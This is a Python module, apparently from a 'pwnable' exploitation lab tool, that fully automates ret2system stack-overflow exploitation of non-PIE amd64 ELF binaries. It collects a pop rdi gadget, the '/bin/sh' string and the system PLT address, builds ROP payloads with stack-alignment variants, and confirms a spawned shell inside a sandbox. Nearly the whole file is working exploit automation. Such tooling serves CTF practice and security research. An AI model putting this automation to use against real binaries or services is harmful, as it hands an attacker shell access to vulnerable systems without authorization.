"""완전 자동 ret2system 오케스트레이션 (pop rdi → /bin/sh → system → 셸).

ret2libc 코어와 마찬가지로 **실행이 일어나는 프로세스**(in-process 또는 컨테이너
안의 CLI)에서 호출된다. 바이너리의 ``system`` PLT·``/bin/sh`` 문자열·``pop rdi``
가젯을 정적으로 모아(:func:`analyzer.strategy.ret2system_plan`) payload 를 만들고,
PTY 로 spawn 된 셸에 ``echo <marker>`` 를 흘려 **셸 획득을 직접 증명**한다.
"""

from __future__ import annotations

import secrets
from pathlib import Path

from pwnable_lab.analyzer.strategy import (
    binary_exec_range,
    find_ret_gadget,
    is_pie,
    ret2system_plan,
)
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.sandbox.runner import SandboxLimits, verify_payload, verify_shell


def auto_ret2system(
    binary_path: str, *, offset: int, limits: SandboxLimits | None = None
) -> dict:
    """단일 바이너리에 대해 ret2system 을 자동 구성·검증한다(셸 획득까지 증명)."""

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "amd64-only"}
    if is_pie(image):
        return {"attempted": False, "reason": "pie-needs-base-leak"}
    plan = ret2system_plan(image)
    if plan is None:
        return {"attempted": False, "reason": "no-ret2system-plan"}

    limits = limits or SandboxLimits()
    pop_rdi, binsh, system = plan["pop_rdi"], plan["binsh"], plan["system"]
    ret = find_ret_gadget(image)
    # system 은 진입 시 16바이트 정렬(movaps)을 요구하므로 정렬 변형을 함께 시도한다.
    chains: list[tuple[bool, list[int]]] = [(False, [binsh, system])]
    if ret is not None:
        chains.append((True, [binsh, ret, system]))

    rng = binary_exec_range(image)
    fallback: tuple[bool, dict] | None = None
    for alignment, chain in chains:
        payload = build_overflow(
            offset, pop_rdi, bits=64, chain=[RopStep(a) for a in chain]
        )
        marker = "PWNPILOT_" + secrets.token_hex(4)
        proof = verify_shell(binary_path, payload, marker=marker, limits=limits)
        if proof.shell_spawned:
            return _report(plan, alignment, True, "shell-proven", proof.as_dict())
        # 셸이 안 뜨면, 최소한 제어가 libc 의 system 으로 이전됐는지(ptrace) 확인.
        if fallback is None:
            observation = verify_payload(binary_path, payload, limits=limits)
            rip = observation.observation.rip
            reached = (
                rip is not None and rng is not None and not (rng[0] <= rip < rng[1])
            )
            if reached:
                fallback = (alignment, proof.as_dict())

    if fallback is not None:
        alignment, proof_dict = fallback
        return _report(plan, alignment, True, "control-into-system", proof_dict)
    return _report(plan, False, False, "did-not-spawn-shell", None)


def _report(
    plan: dict,
    alignment: bool,
    succeeded: bool,
    reason: str,
    shell_proof: dict | None,
) -> dict:
    report = {
        "attempted": True,
        "technique": "ret2system",
        "pop_rdi_hex": f"0x{plan['pop_rdi']:x}",
        "binsh_hex": f"0x{plan['binsh']:x}",
        "system_hex": f"0x{plan['system']:x}",
        "alignment_ret_gadget": alignment,
        "shell_proven": reason == "shell-proven",
        "succeeded": succeeded,
        "reason": reason,
    }
    if shell_proof is not None:
        report["shell_proof"] = shell_proof
    return report
